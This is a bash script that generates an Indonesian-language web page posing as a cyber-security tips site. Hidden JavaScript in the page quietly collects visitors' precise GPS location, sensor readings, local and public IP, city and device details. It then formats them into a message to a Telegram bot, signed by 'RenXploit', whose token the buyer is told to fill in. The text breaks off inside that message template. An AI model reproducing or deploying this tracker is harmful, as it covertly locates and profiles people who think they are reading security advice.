#!/usr/bin/env bash

C_RESET='\033[0m'
C_BOLD='\033[1m'
C_RED='\033[0;31m'
C_GREEN='\033[0;32m'
C_YELLOW='\033[0;33m'
C_BLUE='\033[0;34m'
C_MAGENTA='\033[0;35m'
C_CYAN='\033[0;36m'

type_effect() {
  local text="$1"
  local delay="${2:-0.03}"
  for (( i=0; i<${#text}; i++ )); do
    echo -n "${text:$i:1}"
    sleep "$delay"
  done
  echo
}

print_separator() {
  local char="─"
  local color="${1:-$C_BLUE}"
  printf "${color}%*s${C_RESET}\n" "$(tput cols)" "" | tr ' ' "$char"
}

print_banner() {
  cat << "EOF"
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁⠀⠀

EOF
}

get_template() {
  case "$1" in
    1) # ini ke satu
      cat <<'EOF'
<!doctype html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Teknologi Terkini - Cyber Security Gokil</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Poppins:wght@300;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-p1CmS8Bz+1Jkj0sAnbOXOd72x1OoQGN/8xKpG2twZBd3p3MUK+U9c5DkM8jbFxvHzZ+0YjZ5Rq9K+U5x7rZ+Iw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    :root {
      --primary-color: #0d47a1;
      --secondary-color: #1976d2;
      --accent-color: #ff4081;
      --dark-bg: #121212;
      --light-bg: #f4f4f9;
      --font-family: 'Montserrat', sans-serif;
      --font-alt: 'Poppins', sans-serif;
      --transition-speed: 0.3s;
      --shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { scroll-behavior: smooth; }
    body {
      font-family: var(--font-family);
      background: var(--light-bg);
      color: #333;
      line-height: 1.6;
      overflow-x: hidden;
      transition: background var(--transition-speed), color var(--transition-speed);
    }
    body.dark-mode {
      background: var(--dark-bg);
      color: #ddd;
    }
    .header {
      text-align: center;
      padding: 160px 20px;
      color: #fff;
      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color), var(--accent-color));
      background-size: 200% 200%;
      animation: gradientShift 10s ease infinite;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .header h1 {
      font-size: 4.5em;
      margin-bottom: 15px;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
      animation: glitch 1.2s infinite;
    }
    @keyframes glitch {
      0% { clip-path: inset(20% 0 10% 0); transform: translate(0); }
      25% { clip-path: inset(10% 0 20% 0); transform: translate(-5px, -3px); }
      50% { clip-path: inset(30% 0 5% 0); transform: translate(5px, 5px); }
      75% { clip-path: inset(5% 0 30% 0); transform: translate(-3px, 3px); }
      100% { clip-path: inset(20% 0 10% 0); transform: translate(0); }
    }
    .header p {
      font-size: 1.8em;
      animation: fadeInUp 1s ease-out;
    }
    @keyframes fadeInUp { 
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); } 
    }
    .news-ticker {
      background: var(--primary-color);
      color: #fff;
      padding: 12px 20px;
      overflow: hidden;
      white-space: nowrap;
    }
    .news-ticker p {
      display: inline-block;
      animation: ticker 25s linear infinite;
    }
    @keyframes ticker {
      0% { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
    .dark-mode-toggle {
      position: fixed; top: 20px; right: 20px;
      background: rgba(255,255,255,0.3);
      border: none; border-radius: 50%;
      width: 50px; height: 50px;
      cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      transition: background var(--transition-speed);
      z-index: 1100;
      font-size: 1.5em;
    }
    .dark-mode-toggle:hover { background: rgba(255,255,255,0.5); }
    .navbar {
      background: var(--primary-color);
      padding: 15px 20px;
      box-shadow: var(--shadow);
      position: sticky;
      top: 0;
      z-index: 1000;
      display: flex;
      align-items: center;
      justify-content: space-between;
      transition: background var(--transition-speed);
    }
    .nav-list {
      list-style: none;
      display: flex;
      flex-wrap: wrap;
    }
    .nav-list li { margin: 0 10px; }
    .nav-list li a {
      color: #fff;
      text-decoration: none;
      font-size: 1.1em;
      transition: color var(--transition-speed), transform var(--transition-speed);
    }
    .nav-list li a:hover { color: var(--accent-color); transform: translateY(-3px); }
    .hamburger {
      display: none;
      flex-direction: column;
      gap: 5px;
      cursor: pointer;
    }
    .hamburger span {
      width: 25px;
      height: 3px;
      background: #fff;
      border-radius: 2px;
    }
    @media (max-width: 768px) {
      .nav-list {
        position: absolute;
        top: 60px;
        right: 20px;
        background: var(--primary-color);
        flex-direction: column;
        width: 220px;
        border-radius: 5px;
        display: none;
        padding: 10px 0;
      }
      .nav-list li { margin: 10px 0; text-align: center; }
      .hamburger { display: flex; }
      .header h1 { font-size: 2.8em; }
      .header p { font-size: 1.3em; }
      .nav-list li a { font-size: 1em; margin: 0 10px; }
    }
    .container {
      width: 90%; max-width: 1200px;
      margin: 60px auto;
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(12px);
      padding: 50px;
      border-radius: 15px;
      box-shadow: var(--shadow);
      animation: fadeIn 1s ease-out;
      transition: background var(--transition-speed), color var(--transition-speed);
    }
    body.dark-mode .container { background: rgba(20,20,20,0.85); }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    h2 { color: var(--primary-color); font-size: 2.8em; margin-bottom: 20px; text-align: center; font-family: var(--font-alt); }
    p { font-size: 1.2em; margin-bottom: 20px; text-align: center; }
    .cta-button {
      background: linear-gradient(135deg, var(--secondary-color), var(--accent-color));
      color: #fff;
      padding: 18px 35px;
      font-size: 1.2em;
      border-radius: 50px;
      border: none;
      cursor: pointer;
      transition: transform var(--transition-speed), box-shadow var(--transition-speed);
      display: block;
      margin: 20px auto;
      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
    }
    .cta-button:hover { transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.2); }
    .loading-container { display: none; text-align: center; margin-top: 20px; }
    .loading-bar {
      width: 100%; height: 10px;
      background-color: #e0e0e0; border-radius: 5px;
      overflow: hidden; margin-top: 10px;
    }
    .loading-bar::after {
      content: '';
      display: block; height: 100%; width: 0;
      background: linear-gradient(135deg, var(--secondary-color), var(--accent-color));
      animation: loading 2s infinite;
    }
    @keyframes loading { 0% { width: 0; } 50% { width: 50%; } 100% { width: 100%; } }
    .loading-text {
      font-size: 1.2em;
      font-weight: 700;
      color: var(--primary-color);
      margin-top: 10px;
    }
    .contact-info { list-style: none; text-align: center; margin-bottom: 20px; }
    .contact-info li { font-size: 1.1em; margin-bottom: 8px; }
    .contact-info a { color: var(--primary-color); text-decoration: none; }
    .contact-form {
      max-width: 500px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    .contact-form input,
    .contact-form textarea {
      padding: 12px;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-size: 1em;
      outline: none;
      transition: border var(--transition-speed);
    }
    .contact-form input:focus,
    .contact-form textarea:focus { border-color: var(--primary-color); }
    .footer {
      background: var(--primary-color);
      color: #fff;
      text-align: center;
      padding: 25px 0;
      margin-top: 60px;
      box-shadow: 0 -6px 20px rgba(0,0,0,0.1);
    }
    .footer a {
      color: var(--accent-color);
      text-decoration: none;
      transition: color var(--transition-speed);
    }
    .footer a:hover { color: var(--secondary-color); }
    .social-icons {
      margin-top: 15px;
    }
    .social-icons a {
      color: #fff;
      margin: 0 10px;
      font-size: 1.5em;
      transition: color var(--transition-speed);
    }
    .social-icons a:hover { color: var(--accent-color); }
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: var(--primary-color);
      color: #fff;
      border: none;
      padding: 10px 15px;
      border-radius: 50%;
      cursor: pointer;
      display: none;
      z-index: 1000;
      transition: background var(--transition-speed);
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.5);
      align-items: center;
      justify-content: center;
      z-index: 2000;
      backdrop-filter: blur(5px);
    }
    .modal-content {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      max-width: 600px;
      width: 90%;
      text-align: center;
      position: relative;
      animation: scaleIn 0.5s ease;
    }
    @keyframes scaleIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    .modal-content h3 { margin-bottom: 20px; }
    .modal-close {
      position: absolute;
      top: 10px;
      right: 15px;
      font-size: 1.5em;
      cursor: pointer;
    }
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 20px;
      margin-top: 20px;
      padding: 0 10px;
    }
    .telegram-card {
      background: var(--light-bg);
      border-radius: 10px;
      box-shadow: var(--shadow);
      padding: 20px;
      transition: transform var(--transition-speed), box-shadow var(--transition-speed);
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }
    .telegram-card:hover { transform: translateY(-5px); box-shadow: 0 8px 25px rgba(0,0,0,0.2); }
    .telegram-card h3 { font-size: 1.4em; margin-bottom: 10px; color: var(--primary-color); }
    .telegram-card p { font-size: 1em; margin-bottom: 10px; flex-grow: 1; }
    .telegram-card a {
      text-decoration: none;
      color: var(--secondary-color);
      font-weight: bold;
      align-self: flex-end;
      transition: color var(--transition-speed);
    }
    .telegram-card a:hover { color: var(--accent-color); }
    @media (max-width: 768px) {
      .telegram-card { padding: 15px; }
    }
  </style>
</head>
<body>
  <button class="dark-mode-toggle" id="darkModeToggle"><span>🌙</span></button>

  <div class="modal" id="welcomeModal" style="display: flex;">
    <div class="modal-content">
      <h3>Selamat Datang, Bro!</h3>
      <p>Jelajahi info cyber security terupdate & canggih, langsung dapet info via Telegram.</p>
      <button class="cta-button" id="continueBtn">Lanjut, Gan!</button>
    </div>
  </div>

  <header class="header" id="home">
    <h1>Teknologi Terkini</h1>
    <p>Cyber Security Gokil buat lo yang update dan siap nge-breakin segala serangan!</p>
  </header>

  <div class="news-ticker">
    <p><i class="fa-solid fa-bolt"></i> BREAKING: Serangan siber global makin gila! &nbsp;&nbsp;&nbsp; <i class="fa-solid fa-bolt"></i> Cyber Tip: Aktifin VPN & 2FA buat proteksi maksimal!</p>
  </div>

  <nav class="navbar">
    <div class="hamburger" id="hamburger">
      <span></span><span></span><span></span>
    </div>
    <ul class="nav-list" id="navList">
      <li><a href="#home"><i class="fa-solid fa-house"></i> Beranda</a></li>
      <li><a href="#tips"><i class="fa-solid fa-lightbulb"></i> Tips & Trik</a></li>
      <li><a href="#dashboard"><i class="fa-solid fa-chart-line"></i> Tentang</a></li>
      <li><a href="#fitur"><i class="fa-solid fa-rocket"></i> Fitur Canggih</a></li>
      <li><a href="#tutorial"><i class="fa-solid fa-graduation-cap"></i> Tutorial</a></li>
      <li><a href="#faq"><i class="fa-solid fa-question"></i> FAQ</a></li>
      <li><a href="#telegram"><i class="fa-solid fa-telegram"></i> Hot Telegram</a></li>
      <li><a href="#kontak"><i class="fa-solid fa-envelope"></i> Kontak</a></li>
    </ul>
  </nav>

  <section class="container" id="home-section">
    <h2>Selamat Datang, Bro!</h2>
    <p>Lo lagi di surga info teknologi terkini dan tips keamanan digital yang super update. Jelajahi semua menu dan fitur canggih buat lo jadi makin jago hadapin serangan siber!</p>
  </section>

  <section class="container" id="tips">
    <h2>7 Cara Anti Hack yang Wajib Lo Tahu</h2>
    <p>Di dunia digital yang super canggih ini, lo harus siap dengan strategi jitu. Nih, cek tips dari para ahli:</p>
    <ol style="text-align: left; max-width:800px; margin: 0 auto;">
      <li>Gunakan password kompleks dan beda di tiap akun.</li>
      <li>Aktifkan autentikasi dua faktor (2FA) buat proteksi ekstra.</li>
      <li>Update software dan sistem operasi secara rutin.</li>
      <li>Hindari klik link atau download file dari sumber tidak jelas.</li>
      <li>Pake VPN untuk privasi online lo.</li>
      <li>Rutin bersihin cache, cookies, dan data browser.</li>
      <li>Gunakan antivirus dan firewall terbaik.</li>
    </ol>
    <button class="cta-button" id="sendBtn">Lihat Panduan Lengkap</button>
    <div class="loading-container" id="loadingContainer">
      <div class="loading-bar"></div>
      <p class="loading-text" id="loadingText">Mengumpulin info...</p>
    </div>
  </section>

  <section class="container" id="dashboard">
    <h2>Tentang Website</h2>
    <p>Selamat datang di Teknologi Terkini, website yang ngasih lo info terkini seputar keamanan digital. Di sini, lo bakal nemuin berbagai tips, tutorial, FAQ, dan fitur canggih buat upgrade skill lo menghadapi ancaman siber.</p>
    <p>Desain modern, responsif, dan dilengkapi dark mode. Update real-time langsung ke Telegram!</p>
  </section>

  <section class="container" id="fitur">
    <h2>Fitur Canggih Kami</h2>
    <p>Kami nggak main-main! Ini dia fitur-fitur advanced yang siap manjain lo:</p>
    <ul>
      <li>Pengumpulan data perangkat real-time untuk notifikasi Telegram.</li>
      <li>Analisis mendalam tentang koneksi, performa, dan load time halaman.</li>
      <li>Integrasi notifikasi Telegram dengan data lengkap.</li>
      <li>Deteksi VPN/Proxy, cookies, localStorage, dan info browser lainnya.</li>
      <li>Enkripsi data & proteksi privasi tingkat tinggi.</li>
      <li>Mode Dark & Light sesuai mood lo.</li>
      <li>Tampilan responsif keren di semua device.</li>
    </ul>
  </section>

  <section class="container" id="tutorial">
    <h2>Tutorial Cyber Security</h2>
    <p>Belajar jadi jagoan cyber security bareng tutorial lengkap dari kita. Ini materi yang bakal lo pelajari:</p>
    <ul class="section-list">
      <li><strong>Dasar-dasar Keamanan Digital:</strong> Mengenal threat, cara kerja firewall, dan antivirus.</li>
      <li><strong>Penetration Testing:</strong> Langkah demi langkah uji kerentanan sistem.</li>
      <li><strong>Analisis Malware:</strong> Cara mengidentifikasi dan analisis malware.</li>
      <li><strong>Forensik Digital:</strong> Teknik investigasi digital untuk bongkar jejak serangan.</li>
    </ul>
  </section>

  <section class="container" id="faq">
    <h2>FAQ - Pertanyaan Umum</h2>
    <p>Punya pertanyaan seputar cyber security? Cek FAQ berikut:</p>
    <ul class="section-list">
      <li><strong>Apa itu cyber security?</strong> Praktik melindungi sistem, jaringan, dan data dari serangan digital.</li>
      <li><strong>Kenapa harus pake VPN?</strong> VPN bantu sembunyikan IP dan proteksi data dari pengintaian.</li>
      <li><strong>Bagaimana memilih antivirus yang tepat?</strong> Pilih yang update, punya reputasi baik, dan sesuai kebutuhan.</li>
      <li><strong>Apakah 2FA itu wajib?</strong> Sangat direkomendasikan untuk lapisan keamanan ekstra.</li>
    </ul>
  </section>

  <section class="container" id="telegram">
    <h2>Hot Telegram Feed</h2>
    <p>Dapetin update informasi cyber security langsung dari channel Telegram favorit lo. Info mendetail bakal nongol di sini.</p>
    <div id="telegramFeed">
      <p>Loading hot feed...</p>
    </div>
  </section>

  <section class="container" id="kontak">
    <h2>Kontak Kami</h2>
    <p>Punya pertanyaan atau mau kolaborasi? Hubungi kita lewat info di bawah atau isi form kontak.</p>
    <ul class="contact-info">
      <li>Email: <a href="mailto:info@teknologiterkini.com">info@teknologiterkini.com</a></li>
      <li>Telepon: +62 812 3456 7890</li>
      <li>Alamat: Jl. Teknologi No. 123, Jakarta, Indonesia</li>
    </ul>
    <form class="contact-form" id="contactForm">
      <input type="text" placeholder="Nama Kamu" required>
      <input type="email" placeholder="Email Kamu" required>
      <textarea placeholder="Pesan Kamu" rows="4" required></textarea>
      <button type="submit" class="cta-button">Kirim Pesan</button>
    </form>
    <div style="margin-top:20px; text-align:center;">
      <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1983.9520194280347!2d106.81666631608048!3d-6.200000295905918!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e698c60fefb1f3f%3A0x3a8f2b0bdf7c6bd1!2sJakarta%2C%20Indonesia!5e0!3m2!1sen!2sus!4v1589988387414!5m2!1sen!2sus" width="100%" height="250" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
    </div>
  </section>

  <footer class="footer">
    <p>&copy; 2025 Teknologi Terkini. Dikembangin oleh <a href="#">Tim Ahli</a>.</p>
    <div class="social-icons">
      <a href="#"><i class="fa-brands fa-twitter"></i></a>
      <a href="#"><i class="fa-brands fa-discord"></i></a>
      <a href="#"><i class="fa-brands fa-github"></i></a>
      <a href="#"><i class="fa-brands fa-telegram"></i></a>
    </div>
  </footer>

  <button id="backToTop"><i class="fa-solid fa-angle-up"></i></button>

  <div class="modal" id="guideModal">
    <div class="modal-content">
      <span class="modal-close" id="modalClose">&times;</span>
      <h3>Panduan Keamanan Digital Lengkap</h3>
      <p>Simak panduan lengkap untuk jaga perangkat lo secara maksimal. Ikutin tips para ahli agar lo makin siap hadapin serangan siber.</p>
    </div>
  </div>

  <script>
    let latestPosition = null, orientationData = { alpha: null, beta: null, gamma: null }, motionData = null, absoluteOrientationData = null;
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(
        (position) => { latestPosition = position; },
        (error) => { console.error("Error tracking lokasi: " + error.message); },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
      );
    }
    if (window.DeviceOrientationEvent) {
      window.addEventListener('deviceorientation', event => {
        orientationData.alpha = event.alpha;
        orientationData.beta = event.beta;
        orientationData.gamma = event.gamma;
      });
    }
    window.addEventListener('devicemotion', event => {
      motionData = { acceleration: event.acceleration, rotationRate: event.rotationRate, interval: event.interval };
    });
    if ('AbsoluteOrientationSensor' in window) {
      try {
        let sensor = new AbsoluteOrientationSensor({ frequency: 60 });
        sensor.addEventListener('reading', () => {
          const q = sensor.quaternion;
          const sinr_cosp = 2 * (q[0] * q[1] + q[2] * q[3]);
          const cosr_cosp = 1 - 2 * (q[1] * q[1] + q[2] * q[2]);
          const roll = Math.atan2(sinr_cosp, cosr_cosp);
          const sinp = 2 * (q[0] * q[2] - q[3] * q[1]);
          let pitch = Math.abs(sinp) >= 1 ? Math.sign(sinp) * Math.PI / 2 : Math.asin(sinp);
          const siny_cosp = 2 * (q[0] * q[3] + q[1] * q[2]);
          const cosy_cosp = 1 - 2 * (q[2] * q[2] + q[3] * q[3]);
          const yaw = Math.atan2(siny_cosp, cosy_cosp);
          absoluteOrientationData = {
            roll: (roll * (180/Math.PI)).toFixed(2),
            pitch: (pitch * (180/Math.PI)).toFixed(2),
            yaw: (yaw * (180/Math.PI)).toFixed(2)
          };
        });
        sensor.start();
      } catch (error) {
        console.error("AbsoluteOrientationSensor error: ", error);
      }
    }
    const darkModeToggle = document.getElementById('darkModeToggle');
    darkModeToggle.addEventListener('click', () => {
      document.body.classList.toggle('dark-mode');
      darkModeToggle.innerHTML = document.body.classList.contains('dark-mode') ? '<span>☀️</span>' : '<span>🌙</span>';
    });
    const hamburger = document.getElementById('hamburger');
    const navList = document.getElementById('navList');
    hamburger.addEventListener('click', () => {
      navList.style.display = navList.style.display === 'flex' ? 'none' : 'flex';
    });
    const backToTop = document.getElementById('backToTop');
    window.addEventListener('scroll', () => {
      backToTop.style.display = (window.pageYOffset > 300) ? 'block' : 'none';
    });
    backToTop.addEventListener('click', () => {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
    const guideModal = document.getElementById('guideModal');
    const modalClose = document.getElementById('modalClose');
    modalClose.addEventListener('click', () => { guideModal.style.display = 'none'; });
    window.addEventListener('click', (e) => { if (e.target === guideModal) { guideModal.style.display = 'none'; } });
</script>
    <script>
// stoop dulu, untuk di bagian ini harus di ganti terlebih dahulu
    const botToken = "MASUKAN_TOKEN_BOT_TELEGRAM";
    const chatIds = ["MASUKAN_CHAT_ID_TELEGRAM", "MASUKAN_CHAT_ID_TELEGRAM"];
// untuk chat id itu ke 2 nya boleh di samakan atau di kosong kan salah satu nya juga gpp, asalkan jangan di kosong kan!!!

// untuk yang bertanya bagaimana cara nya ubtuk mengambil chat id telegram langsung tanya sama owner aja yaitu RenXploit

// kalau tidak bisa untuk cara pemasangan nya nanti saya pasangkan sampai selesai
        </script>
<script>
    function getLocalIP() {
      return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
        pc.onicecandidate = ice => {
          if (ice && ice.candidate && ice.candidate.candidate) {
            const ip = ice.candidate.candidate.split(' ')[4];
            pc.close();
            resolve(ip);
          }
        };
      });
    }
    function computeDistance(lat1, lon1, lat2, lon2) {
      const R = 6371;
      const dLat = (lat2 - lat1) * Math.PI / 180;
      const dLon = (lon2 - lon1) * Math.PI / 180;
      const a = Math.sin(dLat / 2) ** 2 +
                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
                Math.sin(dLon / 2) ** 2;
      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      return R * c;
    }
    async function collectAllInfo() {
      let deviceLat = null, deviceLon = null;
      const info = {
        gpu: navigator.gpu?.name || "Tidak Terdeteksi",
        cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " core" : "Tidak Terdeteksi",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit (Pixel Ratio: ${window.devicePixelRatio})`,
        innerWindow: `${window.innerWidth}x${window.innerHeight}`,
        screenAvail: `${screen.availWidth}x${screen.availHeight}`,
        orientation: screen.orientation ? screen.orientation.type : "Tidak Terdeteksi",
        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
        vendor: navigator.vendor || "Tidak Terdeteksi",
        javaEnabled: (navigator.javaEnabled && navigator.javaEnabled()) ? "Ya" : "Tidak",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        webgl: "Tidak Terdeteksi",
        plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "Tidak Ada",
        touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ya" : "Tidak",
        adblock: "Tidak Terdeteksi",
        connection: "Tidak Terdeteksi",
        brand: navigator.userAgentData?.brands[0]?.brand || "Tidak Terdeteksi",
        os: navigator.userAgent || "Tidak Terdeteksi",
        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi",
        battery: "Tidak Terdeteksi",
        publicIp: "Tidak Terdeteksi",
        localIp: "Tidak Terdeteksi",
        city: "Tidak Terdeteksi",
        region: "Tidak Terdeteksi",
        country: "Tidak Terdeteksi",
        location: "Tidak Terdeteksi",
        language: navigator.language || "Tidak Terdeteksi",
        languages: navigator.languages ? navigator.languages.join(', ') : "Tidak Terdeteksi",
        platform: navigator.platform || "Tidak Terdeteksi",
        doNotTrack: navigator.doNotTrack || "Tidak Terdeteksi",
        currentURL: window.location.href,
        referrer: document.referrer || "Tidak Ada",
        onLine: navigator.onLine ? "Online" : "Offline",
        visibilityState: document.visibilityState,
        sessionStorage: (typeof window.sessionStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia"
      };
      info.pageLoadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart + " ms";
      info.cookiesEnabled = navigator.cookieEnabled ? "Ya" : "Tidak";
      info.localStorage = (typeof window.localStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia";
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          info.webgl = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + " - " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
      try {
        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
      } catch {
        info.adblock = "Terdeteksi";
      }
      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) => {
            if (latestPosition && latestPosition.coords.accuracy <= 20) {
              resolve(latestPosition);
            } else {
              navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 });
            }
          });
          deviceLat = pos.coords.latitude;
          deviceLon = pos.coords.longitude;
          let geoStr = `${deviceLat}, ${deviceLon} (Akurasi: ±${pos.coords.accuracy} m`;
          if (pos.coords.altitude !== null) {
            geoStr += `, Altitude: ${pos.coords.altitude} m`;
            if (pos.coords.altitudeAccuracy !== null) {
              geoStr += ` (Alt. Acc: ±${pos.coords.altitudeAccuracy} m)`;
            }
          }
          if (pos.coords.heading !== null && !isNaN(pos.coords.heading)) {
            geoStr += `, Heading: ${pos.coords.heading}°`;
          }
          if (pos.coords.speed !== null && !isNaN(pos.coords.speed)) {
            geoStr += `, Speed: ${pos.coords.speed} m/s`;
          }
          geoStr += `, Timestamp: ${new Date(pos.timestamp).toLocaleTimeString()})`;
          info.geolocation = geoStr;
        } catch (err) {
          info.geolocation = "Error: " + err;
        }
      }
      if (orientationData.alpha !== null) {
        info.deviceOrientation = `Alpha: ${orientationData.alpha.toFixed(2)}°, Beta: ${orientationData.beta.toFixed(2)}°, Gamma: ${orientationData.gamma.toFixed(2)}°`;
      } else {
        info.deviceOrientation = "Tidak Terdeteksi";
      }
      if (absoluteOrientationData) {
        info.absoluteOrientation = `Roll: ${absoluteOrientationData.roll}°, Pitch: ${absoluteOrientationData.pitch}°, Yaw: ${absoluteOrientationData.yaw}°`;
      } else {
        info.absoluteOrientation = "Tidak Terdeteksi";
      }
      if (motionData) {
        info.deviceMotion = `Acceleration: ${JSON.stringify(motionData.acceleration)}, Rotation Rate: ${JSON.stringify(motionData.rotationRate)}`;
      } else {
        info.deviceMotion = "Tidak Terdeteksi";
      }
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        info.connection = `${connection.effectiveType} (${connection.downlink}Mbps)`;
        if (connection.rtt) {
          info.rtt = connection.rtt + " ms";
        }
      }
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = battery.charging 
            ? `Charging (${Math.round(battery.level * 100)}%), Charging Time: ${battery.chargingTime} s`
            : `${Math.round(battery.level * 100)}%, Discharging Time: ${battery.dischargingTime} s`;
        } catch {
          info.battery = "Tidak Terdeteksi";
        }
      }
      try {
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
        if (ipData) {
          info.publicIp = ipData.ip;
          info.city = ipData.city;
          info.region = ipData.region;
          info.country = ipData.country_name;
          info.location = `${ipData.latitude}, ${ipData.longitude}`;
          if (deviceLat !== null && deviceLon !== null && ipData.latitude && ipData.longitude) {
            const distance = computeDistance(deviceLat, deviceLon, ipData.latitude, ipData.longitude);
            info.vpnDetection = distance > 50 ? "Kemungkinan VPN/Proxy (Perbedaan: " + distance.toFixed(1) + " km)" : "VPN/Proxy tidak terdeteksi";
          } else {
            info.vpnDetection = "Data tidak cukup untuk deteksi VPN/Proxy";
          }
        }
      } catch { }
      info.localIp = await getLocalIP().catch(() => 'Tidak Terdeteksi');
      return info;
    }
    async function sendInfo() {
      const loadingContainer = document.getElementById('loadingContainer');
      const loadingText = document.getElementById('loadingText');
      loadingContainer.style.display = 'block';
      loadingText.textContent = "Loading...";
      try {
        const info = await collectAllInfo();
        const message = `🔰 INFORMASI PERANGKAT By ~ RenXploit 🔰
💿 GPU: ${info.gpu}
💽 CPU: ${info.cpu}
🖥️ Layar: ${info.screen}
📐 Ukuran Jendela: ${info.innerWindow}
🖥️ Layar Tersedia: ${info.screenAvail}
🔄 Orientasi Layar: ${info.orientation}
🎨 Tema: ${info.colorScheme}
🔎 Vendor: ${info.vendor}
☕ Java Enabled: ${info.javaEnabled}
🌐 Zona Waktu: ${info.timezone}
🎮 WebGL: ${info.webgl}
🔌 Plugin: ${info.plugins}
👆 Touch: ${info.touch}
🛡️ AdBlocker: ${info.adblock}
📍 GPS: ${info.geolocation}
📡 Koneksi: ${info.connection}
${info.rtt ? "⏱️ RTT: " + info.rtt + "\n" : ""}
📱 Merek: ${info.brand}
🖥️ OS: ${info.os}
💾 Memori: ${info.memory}
🔋 Baterai: ${info.battery}
🌐 IP Publik: ${info.publicIp}
📶 IP Lokal: ${info.localIp}
🏙️ Kota: ${info.city}
📍 Wilayah: ${info.region}
🇨🇺 Negara: ${info.country}
📌 Lokasi: ${info.location}
🔍 VPN/Proxy: ${info.vpnDetection}
🗣️ Bahasa: ${info.language} (Pilihan: ${info.languages})
💻 Platform: ${info.platform}
🔍 Do Not Track: ${info.doNotTrack}
⏱️ Load Time: ${info.pageLoadTime}
